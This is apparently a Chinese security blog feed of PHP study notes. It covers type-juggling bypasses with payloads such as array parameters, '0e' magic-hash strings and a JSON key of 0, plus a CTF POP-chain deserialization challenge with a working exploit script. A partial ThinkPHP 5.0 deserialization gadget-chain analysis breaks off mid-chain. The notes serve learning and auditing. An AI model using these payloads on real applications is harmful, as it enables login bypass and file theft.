<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>"php"</code></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
<td><strong><code>false</code></strong></td>
</tr>
<tr>
<td><code>""</code></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>false</code></strong></td>
<td><strong><code>true</code></strong></td>
</tr>
</tbody></table>
<h2 id="0x02-”array-search”与is-array”绕过"><a href="#0x02-”array-search”与is-array”绕过" class="headerlink" title="0x02:”array_search”与is_array”绕过"></a>0x02:”array_search”与is_array”绕过</h2><p>is_array:判断传入的是不是一个数组，array_search（x，$数组）:在数组中寻找与指定值(x)相等的值，array_search函数 类似于”==”，会进行类型的转换</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
<span class="token variable">$test</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"error"</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$test</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"flag"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"false"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>在上面的栗子中，我们可以传入test[]=0来进行绕过，首先test是一个数组，符合is_array的判断，然后test=0；在array_search中0==admin为true，绕过了array_search。</p>
<h2 id="0x03：strcmp漏洞绕过"><a href="#0x03：strcmp漏洞绕过" class="headerlink" title="0x03：strcmp漏洞绕过"></a>0x03：strcmp漏洞绕过</h2><p>strcmp是比较两个字符串，str1&lt;str2，返回&lt;0，str1&gt;str2,返回&gt;0,相等时返回等于0</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token variable">$password</span><span class="token operator">=</span><span class="token string">"***************"</span>
     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
           <span class="token keyword">echo</span> <span class="token string">"Right!!!login success"</span><span class="token punctuation">;</span>n
           <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
           <span class="token keyword">echo</span> <span class="token string">"Wrong password.."</span><span class="token punctuation">;</span>       
       <span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>上述代码中要求我们post一个password值，要与给定的password变量的值相等，但我们不知道password变量的值是什么！这怎么办呢？<br>stamp期望传入的值是字符串类型，但如果我们传入数组类型会怎么样呢？<br>我们传入 password[]=xxx 可以绕过 是因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等</p>
<h2 id="0x04：md5绕过-Hash比较缺陷"><a href="#0x04：md5绕过-Hash比较缺陷" class="headerlink" title="0x04：md5绕过(Hash比较缺陷)"></a>0x04：md5绕过(Hash比较缺陷)</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'Username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$logined</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token variable">$Username</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'Username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ctype_alpha</span><span class="token punctuation">(</span><span class="token variable">$Username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$logined</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$logined</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$Username</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$logined</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$logined</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"successful"</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
           <span class="token keyword">echo</span> <span class="token string">"login failed!"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token delimiter">?></span>    </code></pre>
<p>题目大意是要输入一个字符串和数字类型，并且他们的md5值相等，就可以成功执行下一步语句 </p>
<p>介绍一批md5开头是0e的字符串 上文提到过，<strong>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0</strong>。**md5(‘240610708’) == md5(‘QNKCDZO’)**成功绕过!</p>
<pre><code>QNKCDZO
0e830400451993494058024219903391

s878926199a
0e545993274517709034328855841020

s155964671a
0e342768416822451524974117254469

s214587387a
0e848240448830537924465865611904

s214587387a
0e848240448830537924465865611904

s878926199a
0e545993274517709034328855841020

s1091221200a
0e940624217856561557816327384675

s1885207154a
0e509367213418206700842008763514</code></pre>
<h2 id="0x05：json绕过"><a href="#0x05：json绕过" class="headerlink" title="0x05：json绕过"></a>0x05：json绕过</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$key</span> <span class="token operator">=</span><span class="token string">"*********"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$message</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">key</span> <span class="token operator">==</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"flag"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> 
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"fail"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
 <span class="token punctuation">}</span>
 <span class="token keyword">else</span><span class="token punctuation">{</span>
     <span class="token keyword">echo</span> <span class="token string">"~~~~"</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></p>
<p>输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于 $key的值，但是$key的值我们不知道，<strong>但是可以利用0==”admin”这种形式绕过</strong></p>
<p><strong>最终payload message={“key”:0}</strong></p>
<h2 id="0x06：switch绕过"><a href="#0x06：switch绕过" class="headerlink" title="0x06：switch绕过"></a>0x06：switch绕过</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token string">"4admin"</span><span class="token punctuation">;</span>
<span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">echo</span> <span class="token string">"fail1"</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token keyword">echo</span> <span class="token string">"fail2"</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>
       <span class="token keyword">echo</span> <span class="token string">"fail3"</span><span class="token punctuation">;</span>
       <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>
        <span class="token keyword">echo</span> <span class="token string">"sucess"</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//结果输出success;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">default</span><span class="token punctuation">:</span>
        <span class="token keyword">echo</span> <span class="token string">"failall"</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>参考：<a href="https://www.cnblogs.com/liangshian/p/10925792.html">https://www.cnblogs.com/liangshian/p/10925792.html</a></p>
<p><a href="https://www.cnblogs.com/Mrsm1th/p/6745532.html">https://www.cnblogs.com/Mrsm1th/p/6745532.html</a></p>
]]></content>
      <tags>
        <tag>PHPsec</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP 魔术方法与pop链学习</title>
    <url>/2021/07/16/phpsec/php-mo-zhu-fang-fa-yu-pop-lian-xue-xi/php-mo-zhu-fang-fa-yu-pop-lian-xue-xi/</url>
    <content><![CDATA[<p>参考：<a href="https://blog.csdn.net/weixin_45645113/article/details/105309695">https://blog.csdn.net/weixin_45645113/article/details/105309695</a></p>
<h3 id="PHP魔术方法："><a href="#PHP魔术方法：" class="headerlink" title="PHP魔术方法："></a>PHP魔术方法：</h3><ul>
<li><strong>__sleep() //使用serialize时触发</strong></li>
<li><strong>__destruct() //对象被销毁时触发</strong></li>
<li>__<strong>call() //在对象上下文中调用不可访问的方法时触发</strong></li>
<li><strong>__callStatic() //在静态上下文中调用不可访问的方法时触发</strong></li>
<li><strong>__get() //用于从不可访问的属性读取数据</strong></li>
<li>__<strong>set() //用于将数据写入不可访问的属性</strong></li>
<li><strong>__isset() //在不可访问的属性上调用isset()或empty()触发</strong></li>
<li><strong>__unset() //在不可访问的属性上使用unset()时触发</strong></li>
<li><strong>__toString() //把类当作字符串使用时触发</strong></li>
<li>__<strong>invoke() //当脚本尝试将对象调用为函数时触发</strong></li>
</ul>
<h3 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token comment" spellcheck="true">//flag is in flag.php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">Read</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Show</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string">'index.php'</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">.</span><span class="token string">'Welcome'</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/gopher|http|ftp|https|dict|\.\.|flag|file/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">"hacker"</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string">"index.php"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Test</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span>
<span class="token punctuation">{</span>
    <span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token string">'pop3.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$show</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<ol>
<li>首先看到unserialize($_GET[‘hello’]) 将get传参的hello进行了反序列化操作。那么将会调用到Show类中</li>
<li>__weakup方法。<br>因为 this-&gt;source = “index.php” source被当做字符串所以调用Show类中的__to string.</li>
<li><strong>return $this-&gt;str[‘str’]-&gt;source</strong> source属性不存在所以调用Test类中的 get方法。</li>
<li><strong>$function = $this-&gt;p;return $function();</strong><br>把取出来的p当做还是调用因此又会引起调用了 Read类中的__invoke方法，其中就可以把文件读取出来了。</li>
</ol>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">Read</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token string">"flag.php"</span>
<span class="token punctuation">}</span>

<span class="token variable">$s</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$t</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$r</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$t</span> <span class="token operator">-</span><span class="token operator">></span> p <span class="token operator">=</span> <span class="token variable">$r</span><span class="token punctuation">;</span>
<span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string">"str"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>
<span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> source <span class="token operator">=</span> <span class="token variable">$s</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
]]></content>
      <tags>
        <tag>PHPsec</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP5.0.18/24反序列化漏洞</title>
    <url>/2021/11/08/phpsec/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/</url>
    <content><![CDATA[<p>seay源码审计，这里是利用点**/thinkphp/library/think/cache/driver/File.php**</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p><img src="/2021/11/08/phpsec/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/4.png" alt="image-20211108141600243"></p>
<p>从反序列化起点开始分析：</p>
<h5 id="thinkphp-library-think-process-pipes-Windows-php"><a href="#thinkphp-library-think-process-pipes-Windows-php" class="headerlink" title="thinkphp/library/think/process/pipes/Windows.php"></a>thinkphp/library/think/process/pipes/Windows.php</h5><p>__destruct方法</p>
<p><img src="/2021/11/08/phpsec/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/2.png" alt="image-20211108142854098"></p>
<p>调用removeFiles，跟进</p>
<p><img src="/2021/11/08/phpsec/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/3.png" alt="image-20211108143027678"></p>
<p>vscode中左上二可进行全局搜索</p>
<p><img src="/2021/11/08/phpsec/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/5.png" alt="image-20211108143117628"></p>
<h5 id="跳板利用点：thinkphp-library-think-Model-php"><a href="#跳板利用点：thinkphp-library-think-Model-php" class="headerlink" title="跳板利用点：thinkphp/library/think/Model.php"></a>跳板利用点：thinkphp/library/think/Model.php</h5><p><img src="/2021/11/08/phpsec/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/6.png" alt="image-20211108143236007"></p>
<p><img src="/2021/11/08/phpsec/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/7.png" alt="image-20211108143300312"></p>
<p>存在三个地方可以调用__call,调试后选择第三处作为跳板</p>
<p><img src="/2021/11/08/phpsec/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/8.png" alt="image-20211108143610613"></p>
<pre class=" language-PHP"><code class="language-PHP">$item[$key] = $value ? $value->getAttr($attr) : null;</code></pre>
<pre class=" language-PHP"><code class="language-PHP">$modelRelation = $this->$relation();
$value         = $this->getRelationData($modelRelation);</code></pre>
<p>getRelationData</p>
<p><img src="/2021/11/08/phpsec/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/9.png" alt="image-20211108145213733"></p>
<p>跟进OneToOne类getBindAttr方法</p>
<p><img src="/2021/11/08/phpsec/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/10.png" alt="image-20211108150005998"></p>
<p>至此代码执行到<code>$item[$key] = $value ? $value-&gt;getAttr($attr) : null;</code>就能够执行Output类__call魔术方法</p>
<h5 id="thinkphp-library-think-console-Output-php"><a href="#thinkphp-library-think-console-Output-php" class="headerlink" title="thinkphp/library/think/console/Output.php"></a>thinkphp/library/think/console/Output.php</h5><p>Output类中__call方法，调用block方法做跳板</p>
<p><img src="/2021/11/08/phpsec/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/11.png" alt="image-20211108142437435"></p>
<p>output类block方法</p>
<p><img src="/2021/11/08/phpsec/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/12.png" alt="image-20211108150404705"></p>
<p>跟进writein</p>
<p><img src="/2021/11/08/phpsec/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/13.png" alt="image-20211108150458498"></p>
<p>跟进Memcached类write方法</p>
<p><img src="/2021/11/08/phpsec/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/14.png" alt="image-20211108150621662"></p>
<p>继续跟进set</p>
